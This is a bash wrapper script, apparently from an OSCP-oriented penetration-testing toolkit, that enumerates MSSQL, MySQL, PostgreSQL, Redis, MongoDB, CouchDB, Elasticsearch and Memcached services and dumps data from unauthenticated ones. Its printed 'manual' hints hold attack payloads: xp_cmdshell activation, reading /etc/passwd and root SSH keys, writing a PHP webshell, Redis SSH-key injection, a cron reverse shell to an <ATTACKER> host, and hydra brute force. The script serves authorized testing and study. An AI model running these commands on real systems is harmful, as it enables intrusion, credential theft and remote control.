#!/usr/bin/env bash
# =============================================================================
#  wrappers/db_enum.sh — Database Enumeration Wrapper
#  Covers: MSSQL (1433), MySQL (3306), PostgreSQL (5432), Redis (6379),
#          MongoDB (27017)
#
#  OSCP compliance:
#    - NSE probes + read-only CLI checks only
#    - NO brute force of any kind
#    - NO exploitation (Redis write-primitive, xp_cmdshell) → manual hints only
#    - Every command printed before execution
#
#  Usage:
#    bash wrappers/db_enum.sh --target <IP> --output-dir <DIR> --ports <CSV>
#
#  Output directory: <DIR>/db/
# =============================================================================
set -uo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; WHITE='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'
# Disable ANSI colors when stdout is not a TTY (e.g. piped to Python)
[ -t 1 ] || { RED=""; GREEN=""; YELLOW=""; CYAN=""; WHITE=""; NC=""; BOLD=""; }

info() { echo -e "  ${CYAN}[*]${NC} $*"; }
ok()   { echo -e "  ${GREEN}[+]${NC} $*"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $*"; }
err()  { echo -e "  ${RED}[-]${NC} $*"; }
cmd()  { echo -e "  ${YELLOW}[CMD]${NC} $*"; }
hint() { echo -e "\n  ${YELLOW}[MANUAL]${NC} $*\n"; }
skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1 not installed — skipping."; }

has_port() { echo ",$PORTS," | grep -q ",$1,"; }

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
TARGET=""; OUTPUT_DIR=""; PORTS=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)     TARGET="$2";     shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        --ports)      PORTS="$2";      shift 2 ;;
        *) err "Unknown argument: $1"; exit 1 ;;
    esac
done

if [[ -z "$TARGET" || -z "$OUTPUT_DIR" || -z "$PORTS" ]]; then
    err "Usage: $0 --target <IP> --output-dir <DIR> --ports <CSV>"
    exit 1
fi

DB_DIR="${OUTPUT_DIR}/db"
mkdir -p "$DB_DIR"

echo ""
echo -e "  ${BOLD}============================================================${NC}"
echo -e "  ${BOLD}  DATABASE ENUM — ${TARGET}${NC}"
echo -e "  ${BOLD}  Ports : ${PORTS}${NC}"
echo -e "  ${BOLD}============================================================${NC}"
echo ""

# ===========================================================================
# Per-step interrupt handler
# Ctrl+C (1st) → skip step, continue  |  Ctrl+C (2nd, <5s) → abort module
# ===========================================================================
STEP_SKIPPED=false; _LAST_SIGINT_TS=0; SKIP_ABORT_WINDOW=5
_sigint_step() {
    local now; now=$(date +%s)
    if (( now - _LAST_SIGINT_TS < SKIP_ABORT_WINDOW )); then
        warn "Second Ctrl+C — aborting enumeration for ${TARGET}"; exit 130
    fi
    _LAST_SIGINT_TS=$now; STEP_SKIPPED=true
    echo ""; warn "⚡ Step interrupted — continuing to next step"
    warn "   (press Ctrl+C again within ${SKIP_ABORT_WINDOW}s to abort entire module)"; echo ""
}
trap '_sigint_step' INT

# ===========================================================================
# MSSQL — port 1433
# ===========================================================================
if has_port 1433; then
    info "[1/5] MSSQL (1433) — NSE enumeration"
    MSSQL_OUT="${DB_DIR}/mssql.txt"

    cmd "nmap -p1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables -Pn $TARGET"
    nmap -p1433 \
        --script 'ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables' \
        -Pn "$TARGET" \
        -oN "$MSSQL_OUT" 2>&1 | tee "$MSSQL_OUT" || {
        warn "nmap (MSSQL) failed — output may be incomplete. Check ${MSSQL_OUT} for details."
    } # IMP-7 applied

    # Flag empty password hits
    if grep -qi "ms-sql-empty-password" "$MSSQL_OUT" 2>/dev/null; then
        warn "MSSQL empty-password account detected — review ${MSSQL_OUT}"
    fi

    # Extract instance names
    INSTANCES=$(grep -oP 'Instance Name:\s+\K\S+' "$MSSQL_OUT" 2>/dev/null | sort -u || true)
    if [[ -n "$INSTANCES" ]]; then
        ok "MSSQL instances found: ${WHITE}${INSTANCES//$'\n'/, }${NC}"
    fi

    hint "MSSQL manual steps:
  # Connect with blank password (sa account):
  impacket-mssqlclient sa:''@${TARGET} -windows-auth

  # Connect with discovered credentials:
  impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@${TARGET} -windows-auth

  # If authenticated — check xp_cmdshell (confirm OSCP scope first):
  SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  SQL> EXEC xp_cmdshell 'whoami'

  # Enumerate databases:
  SQL> SELECT name FROM master.dbo.sysdatabases;"

    hint "MSSQL Linked Servers (lateral movement):
  # Connect first:
  impacket-mssqlclient <user>:<pass>@${TARGET} -windows-auth
  # Inside mssqlclient:
  SQL> SELECT name, data_source FROM sys.linked_servers;
  SQL> EXEC ('SELECT @@version') AT [linked_server_name];
  SQL> EXEC ('SELECT name FROM sys.databases') AT [linked_server_name];
  SQL> EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];"
    echo ""
fi

# ===========================================================================
# MySQL — port 3306
# ===========================================================================
if has_port 3306; then
    info "[2/5] MySQL (3306) — NSE enumeration"
    MYSQL_OUT="${DB_DIR}/mysql.txt"

    cmd "nmap -p3306 --script mysql-info,mysql-empty-password,mysql-enum,mysql-databases,mysql-variables -Pn $TARGET"
    nmap -p3306 \
        --script 'mysql-info,mysql-empty-password,mysql-enum,mysql-databases,mysql-variables' \
        -Pn "$TARGET" \
        -oN "$MYSQL_OUT" 2>&1 | tee "$MYSQL_OUT" || {
        warn "nmap (MySQL) failed — output may be incomplete. Check ${MYSQL_OUT} for details."
    } # IMP-7 applied

    if grep -qi "mysql-empty-password\|root.*empty password" "$MYSQL_OUT" 2>/dev/null; then
        warn "MySQL root with EMPTY PASSWORD detected — review ${MYSQL_OUT}"
    fi

    # Extract version
    MYSQL_VER=$(grep -oP 'MySQL.*\d+\.\d+\.\d+[^\s]*' "$MYSQL_OUT" 2>/dev/null | head -1 || true)
    [[ -n "$MYSQL_VER" ]] && ok "MySQL version: ${WHITE}${MYSQL_VER}${NC}"

    hint "MySQL manual steps:
  # Connect with blank root password:
  mysql -h ${TARGET} -u root --password=''

  # Connect with credentials:
  mysql -h ${TARGET} -u <USER> -p

  # Enumerate after login:
  mysql> SHOW DATABASES;
  mysql> SELECT user,authentication_string FROM mysql.user;
  mysql> SELECT @@datadir;"

    hint "MySQL file read/write (if FILE privilege available):
  # Check privilege:
  SHOW GRANTS FOR CURRENT_USER();
  SHOW VARIABLES LIKE 'secure_file_priv';    -- empty = no restriction
  # Read files:
  SELECT LOAD_FILE('/etc/passwd');
  SELECT LOAD_FILE('/root/.ssh/id_rsa');
  # Write webshell (if web root known):
  SELECT '<?php system(\$_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/cmd.php';
  SELECT '<?php system(\$_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/uploads/cmd.php';"
    echo ""
fi

# ===========================================================================
# PostgreSQL — port 5432
# ===========================================================================
if has_port 5432; then
    info "[3/5] PostgreSQL (5432) — NSE enumeration"
    PGSQL_OUT="${DB_DIR}/pgsql.txt"

    # OSCP+ COMPLIANT — manual only
    cmd "nmap -p5432 --script pgsql-databases -Pn $TARGET"
    nmap -p5432 \
        --script 'pgsql-databases' \
        -Pn "$TARGET" \
        -oN "$PGSQL_OUT" 2>&1 | tee "$PGSQL_OUT" || {
        warn "nmap (PostgreSQL) failed — output may be incomplete. Check ${PGSQL_OUT} for details."
    } # IMP-7 applied

    hint "PostgreSQL brute force — run manually if authorized:
  nmap -p5432 --script pgsql-brute \\
      --script-args brute.firstonly=true -Pn ${TARGET}
  hydra -l postgres -P /usr/share/wordlists/rockyou.txt \\
      ${TARGET} postgres"

    hint "PostgreSQL manual steps:
  # Connect as postgres (blank password):
  psql -h ${TARGET} -U postgres

  # Connect with credentials:
  psql -h ${TARGET} -U <USER> -d <DATABASE>

  # Enumerate after login:
  postgres=# \\list
  postgres=# \\du
  postgres=# SELECT version();
  postgres=# COPY (SELECT '') TO '/tmp/test.txt';  ← file write (confirm scope)"
    echo ""
fi

# ===========================================================================
# Redis — port 6379
# ===========================================================================
if has_port 6379; then
    info "[4/5] Redis (6379) — read-only enumeration"
    REDIS_OUT="${DB_DIR}/redis.txt"

    cmd "nmap -p6379 --script redis-info -Pn $TARGET"
    nmap -p6379 \
        --script 'redis-info' \
        -Pn "$TARGET" \
        -oN "$REDIS_OUT" 2>&1 | tee "$REDIS_OUT" || {
        warn "nmap (Redis) failed — output may be incomplete. Check ${REDIS_OUT} for details."
    } # IMP-7 applied

    if command -v redis-cli &>/dev/null; then
        # Connectivity + server info
        cmd "redis-cli -h $TARGET ping"
        REDIS_PING=$(redis-cli -h "$TARGET" ping 2>/dev/null || true)
        echo "PING: ${REDIS_PING}" >> "$REDIS_OUT"

        if [[ "$REDIS_PING" == "PONG" ]]; then
            ok "Redis responds to PING — unauthenticated access confirmed"

            cmd "redis-cli -h $TARGET INFO server"
            redis-cli -h "$TARGET" INFO server \
                2>&1 | tee "${DB_DIR}/redis_info.txt" || true

            cmd "redis-cli -h $TARGET CONFIG GET dir"
            redis-cli -h "$TARGET" CONFIG GET dir \
                2>&1 | tee -a "${DB_DIR}/redis_info.txt" || true

            cmd "redis-cli -h $TARGET CONFIG GET dbfilename"
            redis-cli -h "$TARGET" CONFIG GET dbfilename \
                2>&1 | tee -a "${DB_DIR}/redis_info.txt" || true

            # SCAN is non-blocking; KEYS '*' blocks the server while iterating all keys
            cmd "redis-cli -h $TARGET SCAN 0 COUNT 100 (non-blocking key sample)"
            redis-cli -h "$TARGET" SCAN 0 COUNT 100 \
                2>&1 | tee "${DB_DIR}/redis_keys.txt" || true

            # Count keys
            KEY_COUNT=$(redis-cli -h "$TARGET" DBSIZE 2>/dev/null || echo "0")
            [[ -n "$KEY_COUNT" ]] && ok "Redis key count: ${WHITE}${KEY_COUNT}${NC}"
        else
            info "Redis did not respond to PING — may require authentication."
        fi
    else
        skip "redis-cli"
    fi

    hint "Redis exploitation (MANUAL ONLY — confirm OSCP exam scope before using):

  # ⚠️  Write primitive — SSH key injection:
  redis-cli -h ${TARGET} CONFIG SET dir /root/.ssh
  redis-cli -h ${TARGET} CONFIG SET dbfilename authorized_keys
  redis-cli -h ${TARGET} SET pwn \"\$(cat ~/.ssh/id_rsa.pub)\"
  redis-cli -h ${TARGET} BGSAVE

  # ⚠️  Cron job for reverse shell:
  redis-cli -h ${TARGET} CONFIG SET dir /var/spool/cron/crontabs
  redis-cli -h ${TARGET} CONFIG SET dbfilename root
  redis-cli -h ${TARGET} SET pwn '\\n\\n* * * * * bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\\n'
  redis-cli -h ${TARGET} BGSAVE

  These techniques write files to disk — they are EXPLOITATION, not enumeration."
    echo ""
fi

# ===========================================================================
# MongoDB — port 27017
# ===========================================================================
if has_port 27017; then
    info "[5/5] MongoDB (27017) — connectivity check only"
    MONGO_OUT="${DB_DIR}/mongodb.txt"

    cmd "nmap -p27017 --script mongodb-info,mongodb-databases -Pn $TARGET"
    nmap -p27017 \
        --script 'mongodb-info,mongodb-databases' \
        -Pn "$TARGET" \
        -oN "$MONGO_OUT" 2>&1 | tee "$MONGO_OUT" || {
        warn "nmap (MongoDB) failed — output may be incomplete. Check ${MONGO_OUT} for details."
    } # IMP-7 applied

    hint "MongoDB manual steps:
  # Connect (no auth):
  mongosh --host ${TARGET} --port 27017

  # Enumerate:
  > show dbs
  > use admin
  > db.system.users.find()
  > db.adminCommand({listDatabases: 1})"
    echo ""
fi

# ---------------------------------------------------------------------------
# CouchDB (5984)
# ---------------------------------------------------------------------------
if echo "$PORTS" | grep -qw "5984"; then
    COUCH_DIR="${OUTPUT_DIR}/db/couchdb"
    mkdir -p "$COUCH_DIR"
    info "[CouchDB] CouchDB enumeration on port 5984"

    cmd "curl -sk http://${TARGET}:5984/"
    COUCH_ROOT=$(curl -sk --max-time 10 "http://${TARGET}:5984/" 2>/dev/null || true)
    echo "$COUCH_ROOT" > "${COUCH_DIR}/couch_root.txt"

    if echo "$COUCH_ROOT" | grep -qi '"couchdb"'; then
        COUCH_VER=$(echo "$COUCH_ROOT" | grep -oP '"version"\s*:\s*"\K[^"]+' || true)
        ok "CouchDB ${WHITE}${COUCH_VER}${NC} accessible without authentication"
        warn "CouchDB unauthenticated access — HIGH severity"

        # List databases
        cmd "curl -sk http://${TARGET}:5984/_all_dbs"
        curl -sk --max-time 10 "http://${TARGET}:5984/_all_dbs" \
            2>/dev/null | tee "${COUCH_DIR}/couch_dbs.txt" || true

        # Check Futon/Fauxton admin panel
        FUTON_CODE=$(curl -sk --max-time 5 -o /dev/null -w '%{http_code}' \
            "http://${TARGET}:5984/_utils/" 2>/dev/null || true)
        [[ "$FUTON_CODE" == "200" ]] && warn "CouchDB admin panel (Fauxton) accessible at http://${TARGET}:5984/_utils/"

        # Dump first 5 docs from each database
        DB_LIST=$(curl -sk --max-time 10 "http://${TARGET}:5984/_all_dbs" 2>/dev/null \
            | grep -oP '"[^"_][^"]*"' | tr -d '"' | head -10 || true)
        while IFS= read -r db_name; do
            [[ -z "$db_name" ]] && continue
            cmd "curl -sk http://${TARGET}:5984/${db_name}/_all_docs?limit=5"
            curl -sk --max-time 10 \
                "http://${TARGET}:5984/${db_name}/_all_docs?limit=5&include_docs=true" \
                2>/dev/null | tee "${COUCH_DIR}/couch_db_${db_name}.txt" || true
            ok "CouchDB database ${WHITE}${db_name}${NC} → ${COUCH_DIR}/couch_db_${db_name}.txt"
        done <<< "$DB_LIST"
    else
        info "CouchDB requires authentication or not responding."
    fi

    hint "CouchDB manual steps:
  # List all databases:
  curl -s http://${TARGET}:5984/_all_dbs

  # Dump a specific database:
  curl -s http://${TARGET}:5984/<DB_NAME>/_all_docs?include_docs=true

  # Admin panel:
  curl -s http://${TARGET}:5984/_utils/

  # If credentials found:
  curl -s http://<USER>:<PASS>@${TARGET}:5984/_all_dbs"
    echo ""
fi

# ---------------------------------------------------------------------------
# Elasticsearch (9200)
# ---------------------------------------------------------------------------
if echo "$PORTS" | grep -qw "9200" || echo "$PORTS" | grep -qw "9300"; then
    ES_PORT=$(echo "$PORTS" | grep -oP '9[23]00' | head -1 || true)
    ES_PORT="${ES_PORT:-9200}"
    ES_DIR="${OUTPUT_DIR}/db/elasticsearch"
    mkdir -p "$ES_DIR"
    info "[ES] Elasticsearch enumeration on port ${ES_PORT}"

    # Version + cluster info
    cmd "curl -sk http://${TARGET}:${ES_PORT}/"
    ES_ROOT=$(curl -sk --max-time 10 "http://${TARGET}:${ES_PORT}/" 2>/dev/null || true)
    echo "$ES_ROOT" > "${ES_DIR}/es_root.txt"

    if echo "$ES_ROOT" | grep -qi '"name"'; then
        ES_VERSION=$(echo "$ES_ROOT" | grep -oP '"number"\s*:\s*"\K[^"]+' || true)
        ES_CLUSTER=$(echo "$ES_ROOT" | grep -oP '"cluster_name"\s*:\s*"\K[^"]+' || true)
        ok "Elasticsearch ${WHITE}${ES_VERSION}${NC} — cluster: ${WHITE}${ES_CLUSTER}${NC}"
        warn "Elasticsearch accessible WITHOUT authentication — HIGH severity"

        # List indices
        cmd "curl -sk http://${TARGET}:${ES_PORT}/_cat/indices?v"
        curl -sk --max-time 15 "http://${TARGET}:${ES_PORT}/_cat/indices?v" \
            2>/dev/null | tee "${ES_DIR}/es_indices.txt" || true

        # Node info
        cmd "curl -sk http://${TARGET}:${ES_PORT}/_cat/nodes?v"
        curl -sk --max-time 10 "http://${TARGET}:${ES_PORT}/_cat/nodes?v" \
            2>/dev/null | tee "${ES_DIR}/es_nodes.txt" || true

        # Dump first document from each index
        if [[ -s "${ES_DIR}/es_indices.txt" ]]; then
            INDEX_NAMES=$(grep -oP '^\S+' "${ES_DIR}/es_indices.txt" \
                | grep -v '^index' | head -10 || true)
            while IFS= read -r idx_name; do
                [[ -z "$idx_name" ]] && continue
                cmd "curl -sk http://${TARGET}:${ES_PORT}/${idx_name}/_search?size=1"
                curl -sk --max-time 10 \
                    "http://${TARGET}:${ES_PORT}/${idx_name}/_search?size=1" \
                    2>/dev/null | tee "${ES_DIR}/es_idx_${idx_name}.txt" || true
                ok "Index ${WHITE}${idx_name}${NC} sample → ${ES_DIR}/es_idx_${idx_name}.txt"
            done <<< "$INDEX_NAMES"
        fi

        hint "Elasticsearch full dump:
  curl -sk 'http://${TARGET}:${ES_PORT}/_search?size=1000&pretty'
  curl -sk 'http://${TARGET}:${ES_PORT}/_all/_search?size=100&pretty'
  # Check for passwords/credentials in data:
  curl -sk 'http://${TARGET}:${ES_PORT}/_all/_search?q=password&pretty'"
    else
        info "Elasticsearch requires authentication or port not responding."
    fi
fi

# ---------------------------------------------------------------------------
# Memcached (11211)
# ---------------------------------------------------------------------------
if echo "$PORTS" | grep -qw "11211"; then
    MEMC_DIR="${OUTPUT_DIR}/db/memcached"
    mkdir -p "$MEMC_DIR"
    info "[Memcached] Memcached enumeration on port 11211"

    # Stats
    cmd "echo 'stats' | nc -w 3 ${TARGET} 11211"
    MEMC_STATS=$(echo "stats" | nc -w 3 "$TARGET" 11211 2>/dev/null || true)
    echo "$MEMC_STATS" > "${MEMC_DIR}/memcached_stats.txt"

    if [[ -n "$MEMC_STATS" ]]; then
        MEMC_VER=$(echo "$MEMC_STATS" | grep -oP 'STAT version \K\S+' || true)
        ok "Memcached ${WHITE}${MEMC_VER}${NC} — NO authentication required"
        warn "Memcached unauthenticated access — can read all cached data"

        # Get slab info to find active slabs
        cmd "echo 'stats slabs' | nc -w 3 ${TARGET} 11211"
        MEMC_SLABS=$(echo "stats slabs" | nc -w 3 "$TARGET" 11211 2>/dev/null || true)
        echo "$MEMC_SLABS" > "${MEMC_DIR}/memcached_slabs.txt"

        # Dump keys from each active slab
        SLAB_IDS=$(echo "$MEMC_SLABS" | grep -oP 'STAT (\d+):' \
            | grep -oP '\d+' | sort -un | head -20 || true)
        > "${MEMC_DIR}/memcached_keys.txt"

        while IFS= read -r slab_id; do
            [[ -z "$slab_id" ]] && continue
            KEY_DUMP=$(printf "stats cachedump %s 100\r\n" "$slab_id" \
                | nc -w 3 "$TARGET" 11211 2>/dev/null || true)
            echo "$KEY_DUMP" >> "${MEMC_DIR}/memcached_keys.txt"
        done <<< "$SLAB_IDS"

        KEY_COUNT=$(grep -c '^ITEM' "${MEMC_DIR}/memcached_keys.txt" 2>/dev/null || echo 0)
        ok "Memcached keys found: ${WHITE}${KEY_COUNT}${NC} → ${MEMC_DIR}/memcached_keys.txt"

        # Flag interesting keys
        INTERESTING=$(grep -iE 'session|password|passwd|token|auth|user|secret|key|cred' \
            "${MEMC_DIR}/memcached_keys.txt" 2>/dev/null || true)
        [[ -n "$INTERESTING" ]] && warn "Interesting keys found:\n${INTERESTING}"

        hint "Memcached — get value of a key:
  echo 'get <key_name>' | nc -w 2 ${TARGET} 11211
  # Dump all keys and values:
  for key in \$(echo 'stats cachedump 1 100' | nc -w 2 ${TARGET} 11211 | grep -oP 'ITEM \K[^ ]+'); do
      echo \"=== \$key ===\"; echo \"get \$key\" | nc -w 2 ${TARGET} 11211; done"
    else
        info "Memcached not responding or port closed."
    fi
fi

ok "Database enumeration complete — output: ${DB_DIR}/"
echo ""
